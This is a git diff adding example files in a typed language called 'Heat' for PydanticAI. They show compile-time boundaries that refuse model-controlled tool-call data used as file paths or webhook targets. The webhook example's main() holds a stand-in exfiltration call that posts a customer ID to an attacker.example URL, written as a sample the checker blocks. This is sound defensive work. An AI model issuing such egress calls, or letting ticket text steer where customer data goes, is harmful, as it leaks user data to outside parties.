+// Repaired PydanticAI boundary: model-shaped path is validated before egress.
+struct ToolCall:
+    path: String
+    content: String
+
+fn export_case_file(path: String @path_safe, content: String @user_input) -> Result[Int, String] [io]:
+    return write_file(path: path, content: content)
+
+fn dispatch(tool_json: String) -> Int [io]:
+    match json_extract[ToolCall](text: tool_json):
+        Result.ok(call):
+            let safe_path = escape_path(raw: call.path)
+            let _ = export_case_file(path: safe_path, content: call.content)
+            return 0
+        Result.error(message):
+            print(value: message)
+            return 1
+
+fn main() -> Int [io]:
+    return dispatch(tool_json: "{\"path\":\"/tmp/heat_pydanticai_public_case.txt\",\"content\":\"customer_id=4142\"}")
diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_helper_bypass.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_helper_bypass.heat
new file mode 100644
index 0000000..a098ffb
--- /dev/null
+++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_helper_bypass.heat
@@ -0,0 +1,32 @@
+// Missed-helper proof: a future helper forgets the adapter convention.
+//
+// In Python, a helper can write the file directly if the author forgets the
+// runtime guard. In Heat, the sink still requires @path_safe, so the unsafe
+// flow is refused at write_file even though it travels through another helper.
+obligation NoTicketTextToFilesystem:
+    "Ticket/model-controlled data must not choose filesystem export paths."
+    repair "route through escape_path (returns @path_safe)"
+    forbid @user_input -> @path_safe
+
+struct ToolCall:
+    path: String
+    content: String
+
+fn write_export_file(path: String @user_input, content: String @user_input) -> Result[Int, String] [io]:
+    // REFUSED: the helper forgot the boundary, but the sink did not.
+    return write_file(path: path, content: content)
+
+fn export_case_file_via_helper(path: String @user_input, content: String @user_input) -> Result[Int, String] [io]:
+    return write_export_file(path: path, content: content)
+
+fn dispatch(tool_json: String) -> Int [io]:
+    match json_extract[ToolCall](text: tool_json):
+        Result.ok(call):
+            let _ = export_case_file_via_helper(path: call.path, content: call.content)
+            return 0
+        Result.error(message):
+            print(value: message)
+            return 1
+
+fn main() -> Int [io]:
+    return dispatch(tool_json: "{\"path\":\"/tmp/heat_pydanticai_public_case.txt\",\"content\":\"customer_id=4142\"}")
diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook.heat
new file mode 100644
index 0000000..6a9b593
--- /dev/null
+++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook.heat
@@ -0,0 +1,24 @@
+// Second sink class: model-controlled webhook egress.
+//
+// Shape validation can tell us `url` and `body` are strings. It cannot prove
+// that untrusted ticket text is safe to send over the network. Heat's HTTP
+// sink requires @audit_safe, so model-controlled webhook egress is refused.
+struct WebhookCall:
+    url: String
+    body: String
+
+fn notify_webhook(url: String @user_input, body: String @user_input) -> Int [net]:
+    // REFUSED: both http_post URL and body are @audit_safe sinks.
+    let _ = http_post(url: url, body: body)
+    return 0
+
+fn dispatch(tool_json: String) -> Int [net]:
+    match json_extract[WebhookCall](text: tool_json):
+        Result.ok(call):
+            return notify_webhook(url: call.url, body: call.body)
+        Result.error(message):
+            let _ = message
+            return 1
+
+fn main() -> Int [net]:
+    return dispatch(tool_json: "{\"url\":\"https://attacker.example/hook\",\"body\":\"customer_id=4142\"}")
diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook_fixed.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook_fixed.heat
